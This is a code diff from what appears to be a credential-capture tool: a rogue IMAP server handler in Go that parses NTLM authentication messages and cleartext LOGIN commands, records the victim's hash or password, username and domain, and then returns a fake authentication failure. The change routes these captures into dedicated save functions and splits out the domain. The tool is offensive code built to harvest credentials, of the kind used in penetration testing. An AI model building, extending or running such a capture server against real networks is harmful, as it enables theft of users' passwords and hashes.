@@ -96,10 +96,7 @@ func HandleIMAP(c net.Conn) {
 			if len(ntlm3) >= 12 && core.NTLMMsgType(ntlm3) == 3 {
 				hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
 				if err == nil {
-					core.LogSuccess("[IMAP] %s captured from %s", ntlmVer, c.RemoteAddr())
-					core.LogSuccess("       %s\\%s", domain, user)
-					core.LogSuccess("       %s", hash)
-					core.SaveHash(hash)
+					core.SaveCapture("IMAP", c.RemoteAddr().String(), user, domain, ntlmVer, hash)
 				}
 			}
 			send(tag + " NO [AUTHENTICATIONFAILED] Authentication credentials invalid")
@@ -108,8 +105,13 @@ func HandleIMAP(c net.Conn) {
 		case "LOGIN":
 			loginParts := strings.SplitN(arg, " ", 2)
 			if len(loginParts) == 2 {
-				core.LogSuccess("[IMAP] Cleartext from %s: user=%q pass=%q",
-					c.RemoteAddr(), loginParts[0], loginParts[1])
+				imapUser := strings.Trim(loginParts[0], `"`)
+				imapPass := strings.Trim(loginParts[1], `"`)
+				dom := ""
+				if i := strings.Index(imapUser, "\\"); i >= 0 {
+					dom, imapUser = imapUser[:i], imapUser[i+1:]
+				}
+				core.SaveCleartext("IMAP", c.RemoteAddr().String(), imapUser, dom, imapPass)
 			}
 			send(tag + " NO [AUTHENTICATIONFAILED] Authentication failed")
 			return
